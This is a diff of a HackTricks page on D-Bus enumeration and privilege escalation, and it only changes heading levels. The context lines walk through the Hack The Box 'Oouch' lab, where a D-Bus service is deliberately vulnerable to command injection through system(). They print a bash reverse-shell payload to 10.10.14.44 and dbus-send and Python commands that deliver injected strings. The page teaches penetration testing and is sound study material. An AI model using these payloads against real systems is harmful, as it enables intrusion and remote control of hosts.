@@ -17,9 +17,7 @@ Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
 </details>
 
 
-# D-Bus Enumeration & Command Injection Privilege Escalation
-
-## **GUI enumeration**
+# **GUI enumeration**
 
 **(This enumeration info was taken from** [**https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/**](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)**)**
 
@@ -59,9 +57,9 @@ _Figure 4. A method that requires authorization_
 
 Also note that some of the services query another D-Bus service named org.freedeskto.PolicyKit1 whether a user should be allowed to perform certain actions or not.
 
-## **Cmd line Enumeration**
+# **Cmd line Enumeration**
 
-### List Service Objects
+## List Service Objects
 
 It's possible to list opened D-Bus interfaces with:
 
@@ -89,11 +87,11 @@ org.freedesktop.hostname1                - -               -                (act
 org.freedesktop.locale1                  - -               -                (activatable) -                         - 
 ```
 
-#### Connections
+### Connections
 
 When a process sets up a connection to a bus, the bus assigns to the connection a special bus name called _unique connection name_. Bus names of this type are immutable—it's guaranteed they won't change as long as the connection exists—and, more importantly, they can't be reused during the bus lifetime. This means that no other connection to that bus will ever have assigned such unique connection name, even if the same process closes down the connection to the bus and creates a new one. Unique connection names are easily recognizable because they start with the—otherwise forbidden—colon character.
 
-### Service Object Info
+## Service Object Info
 
 Then, you can obtain some information about the interface with:
 
@@ -157,7 +155,7 @@ BoundingCapabilities=cap_chown cap_dac_override cap_dac_read_search
         cap_wake_alarm cap_block_suspend cap_audit_read
 ```
 
-### List Interfaces of a Service Object
+## List Interfaces of a Service Object
 
 You need to have enough permissions.
 
@@ -169,7 +167,7 @@ busctl tree htb.oouch.Block #Get Interfaces of the service object
     └─/htb/oouch/Block
 ```
 
-### Introspect Interface of a Service Object
+## Introspect Interface of a Service Object
 
 Note how in this example it was selected the latest interface discovered using the `tree` parameter (_see previous section_):
 
@@ -193,7 +191,7 @@ org.freedesktop.DBus.Properties     interface -         -            -
 
 Note the method `.Block` of the interface `htb.oouch.Block` (the one we are interested in). The "s" of the other columns may mean that it's expecting a string.
 
-### Monitor/Capture Interface
+## Monitor/Capture Interface
 
 With enough privileges (just `send_destination` and `receive_sender` privileges aren't enough) you can **monitor a D-Bus communication**.
 
@@ -234,7 +232,7 @@ Monitoring bus message stream.
 
 You can use `capture` instead of `monitor` to save the results in a pcap file.
 
-#### Filtering all the noise <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>
+### Filtering all the noise <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>
 
 If there is just too much information on the bus, pass a match rule like so:
 
@@ -256,11 +254,11 @@ See the [D-Bus documentation](http://dbus.freedesktop.org/doc/dbus-specification
 
 
 
-### More
+## More
 
 `busctl` have even more options, [**find all of them here**](https://www.freedesktop.org/software/systemd/man/busctl.html).
 
-## **Vulnerable Scenario**
+# **Vulnerable Scenario**
 
 As user **qtc inside the host "oouch" from HTB** you can find an **unexpected D-Bus config file** located in _/etc/dbus-1/system.d/htb.oouch.Block.conf_:
 
@@ -306,7 +304,7 @@ As you can see, it is **connecting to a D-Bus interface** and sending to the **"
 In the other side of the D-Bus connection there is some C compiled binary running. This code is **listening** in the D-Bus connection **for IP address and is calling iptables via `system` function** to block the given IP address.\
 **The call to `system` is vulnerable on purpose to command injection**, so a payload like the following one will create a reverse shell: `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`
 
-### Exploit it
+## Exploit it
 
 At the end of this page you can find the **complete C code of the D-Bus application**. Inside of it you can find between the lines 91-97 **how the **_**D-Bus object path**_ **and **_**interface name**_** are registered**. This information will be necessary to send information to the D-Bus connection:
 
@@ -326,7 +324,7 @@ Also, in line 57 you can find that **the only method registered** for this D-Bus
 SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
 ```
 
-#### Python
+### Python
 
 The following python code will send the payload to the D-Bus connection to the `Block` method via `block_iface.Block(runme)` (_note that it was extracted from the previous chunk of code_):
 
@@ -340,7 +338,7 @@ response = block_iface.Block(runme)
 bus.close()
 ```
 
-#### busctl and dbus-send
+### busctl and dbus-send
 
 ```bash
 dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
@@ -355,7 +353,7 @@ dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oou
 
 _Note that in `htb.oouch.Block.Block`, the first part (`htb.oouch.Block`) references the service object and the last part (`.Block`) references the method name._
 
-### C code
+## C code
 
 {% code title="d-bus_server.c" %}
 ```c
